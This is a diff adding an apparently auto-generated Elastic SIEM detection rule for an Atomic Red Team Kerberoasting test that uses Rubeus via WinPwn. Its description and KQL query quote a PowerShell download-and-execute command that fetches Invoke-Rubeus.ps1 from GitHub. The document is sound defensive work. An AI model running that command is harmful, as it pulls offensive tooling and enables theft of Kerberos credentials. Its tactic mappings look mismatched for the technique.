@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'WinPwn - PowerSharpPack - Kerberoasting Using Rubeus' (GUID: 29094950-2c96-4cbd-b5e4-f7c65079678f) of technique T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting). Test Description: PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn. Command/Steps: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus...."
+from = "now-9m"
+rule_id = "316a5d34-8f29-4bab-813b-65c88c0aae67"
+language = "kql"
+name = "Atomic Test: T1558.003 - WinPwn - PowerSharpPack - Kerberoasting Using Rubeus"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1558.003/T1558.003.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1558.003", "29094950-2c96-4cbd-b5e4-f7c65079678f", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*iex(new-object*\\\" AND powershell.script_block_text : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')*\\\" AND powershell.script_block_text : \\\"*Invoke-Rubeus*\\\" OR (process.command_line : \\\"*iex(new-object*\\\" AND process.command_line : \\\"*net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')*\\\" AND process.command_line : \\\"*Invoke-Rubeus*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1558.003"
+name = "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus"
+reference = "https://attack.mitre.org/techniques/T1558/003"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1558/003"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1558/003"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1558/003"
+
+
